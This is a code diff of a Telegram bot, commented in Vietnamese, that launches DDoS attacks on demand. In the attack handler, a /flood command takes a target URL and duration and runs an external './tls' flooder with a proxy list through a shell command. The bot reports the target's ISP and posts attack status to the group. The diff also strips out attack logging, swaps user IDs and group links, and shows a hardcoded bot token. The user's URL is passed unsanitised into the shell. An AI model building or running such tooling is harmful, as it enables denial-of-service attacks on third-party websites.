@@ -6,13 +6,12 @@ import socket
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from urllib import parse
-import uuid
 
 # ID của nhóm cho phép
 ALLOWED_CHAT_ID = -1002673143239  # Thay thế bằng ID nhóm của bạn
 
 # ID của người dùng được phép tấn công không giới hạn
-ALLOWED_USER_ID = 5942559129  # Thay thế bằng ID người dùng của bạn
+ALLOWED_USER_ID = 5622708943  # Thay thế bằng ID người dùng của bạn
 
 # Token của bạn
 token_input = '7567331917:AAHPY5MjMiWV8_1STW2q5Q7sbzGiAokpbio'
@@ -20,9 +19,6 @@ token_input = '7567331917:AAHPY5MjMiWV8_1STW2q5Q7sbzGiAokpbio'
 # Cờ để kiểm tra xem có ai đang tấn công hay không
 is_attacking = False
 ongoing_info = {}  # Lưu thông tin ongoing
-
-# Đường dẫn file JSON để lưu thông tin tấn công
-ATTACKED_FILE = 'attacked.json'
 
 def escape_html(text):
     escape_characters = {
@@ -58,34 +54,6 @@ def get_isp_info(ip):
         print(f"Không thể lấy thông tin ISP: {str(e)}")
         return None
 
-def save_attack_info(user_id, command, time, count, attack_id, url):
-    try:
-        # Đọc file attacked.json nếu tồn tại
-        try:
-            with open(ATTACKED_FILE, 'r', encoding='utf-8') as f:
-                attacked_data = json.load(f)
-        except FileNotFoundError:
-            attacked_data = {}
-
-        # Cập nhật thông tin tấn công cho user_id
-        if user_id not in attacked_data:
-            attacked_data[user_id] = {"count": 0, "attacks": []}
-        
-        attacked_data[user_id]["count"] += 1
-        attacked_data[user_id]["attacks"].append({
-            "attack_id": attack_id,
-            "command": command,
-            "time": time,
-            "url": url
-        })
-
-        # Lưu lại dữ liệu vào file
-        with open(ATTACKED_FILE, 'w', encoding='utf-8') as f:
-            json.dump(attacked_data, f, indent=2, ensure_ascii=False)
-
-    except Exception as e:
-        print(f"Đã xảy ra lỗi khi lưu thông tin tấn công: {str(e)}")
-
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global is_attacking
 
@@ -115,41 +83,19 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False)
             isp_info_text = escape_html(isp_info_text)
             user_name = update.effective_user.first_name or "Người dùng"
-            
-            # Lấy thông tin tấn công đã lưu
-            try:
-                with open(ATTACKED_FILE, 'r', encoding='utf-8') as f:
-                    attacked_data = json.load(f)
-            except FileNotFoundError:
-                attacked_data = {}
-
-            # Cập nhật số lần tấn công
-            if update.effective_user.id not in attacked_data:
-                attacked_data[update.effective_user.id] = {"count": 0, "attacks": []}
-            
-            attacked_data[update.effective_user.id]["count"] += 1
-            attack_id = attacked_data[update.effective_user.id]["count"]
-
-            # Lưu lại dữ liệu vào file
-            with open(ATTACKED_FILE, 'w', encoding='utf-8') as f:
-                json.dump(attacked_data, f, indent=2, ensure_ascii=False)
-
-            # Hiển thị thông tin tấn công với attack_id
             await update.message.reply_text(
-                f"Tấn công đã được gửi! \n Attack ID: {attack_id} \n Target: {escape_html(url)}\n<pre>{isp_info_text}</pre>\n🔥Tấn công được gửi bởi: {escape_html(user_name)}🔥",
+                f"Tấn công đã được gửi!\nThông tin ISP của host {escape_html(url)}\n<pre>{isp_info_text}</pre>\n🔥Tấn công được gửi bởi: {escape_html(user_name)}🔥",
                 parse_mode='HTML'
             )
 
-        # Lưu thông tin tấn công vào file
-        save_attack_info(update.effective_user.id, '/flood', time, 1, attack_id, url)
-
         is_attacking = True
-        ongoing_info[update.effective_user.id] = {"url": url, "time_left": time, "attack_id": attack_id}
+        ongoing_info[update.effective_user.id] = {"url": url, "time_left": time}
 
         command = f"screen -dmS tls chmod 777 * && ./tls {url} {time} 32 4 proxy.txt"
 
+        # Chạy tiến trình DDoS
         process = subprocess.Popen(command, shell=True)
-        await asyncio.sleep(1)
+        await asyncio.sleep(1)  # Đợi một chút để tiến trình có thời gian khởi động
 
         for remaining in range(time, 0, -1):
             ongoing_info[update.effective_user.id]["time_left"] = remaining
@@ -159,20 +105,21 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"Đã hoàn thành tấn công {escape_html(url)}.")
 
     except IndexError:
-        await update.message.reply_text("Vui lòng nhập đúng lệnh: /flood (url) (time)")
+        await update.message.reply_text("Vui lòng nhập đúng lệnh: /bypass hoặc /flood (url) (time)")
+
     except ValueError:
         await update.message.reply_text("Thời gian phải là một số nguyên.")
-    except subprocess.SubprocessError as e:
-        await update.message.reply_text(f"Đã xảy ra lỗi trong quá trình tấn công: {str(e)}")
+
     except Exception as e:
         await update.message.reply_text(f"Đã xảy ra lỗi: {str(e)}")
+
     finally:
         is_attacking = False
         ongoing_info.pop(update.effective_user.id, None)
 
 async def ongoing(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat.id != ALLOWED_CHAT_ID:
-        await update.message.reply_text("Bot chỉ hoạt động trong: https://t.me/beonetworkjs. Vui lòng tham gia nhóm để sử dụng bot.")
+        await update.message.reply_text("Bot chỉ hoạt động trong: https://t.me/NhanBbos. Vui lòng tham gia nhóm để sử dụng bot.")
         return
 
     if update.effective_user.id in ongoing_info:
@@ -185,7 +132,7 @@ async def ongoing(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat.id != ALLOWED_CHAT_ID:
-        await update.message.reply_text("Bot chỉ hoạt động trong: https://t.me/beonetworkjs. Vui lòng tham gia nhóm để sử dụng bot.")
+        await update.message.reply_text("Bot chỉ hoạt động trong: https://t.me/NhanBbos. Vui lòng tham gia nhóm để sử dụng bot.")
         return
 
     help_info = {
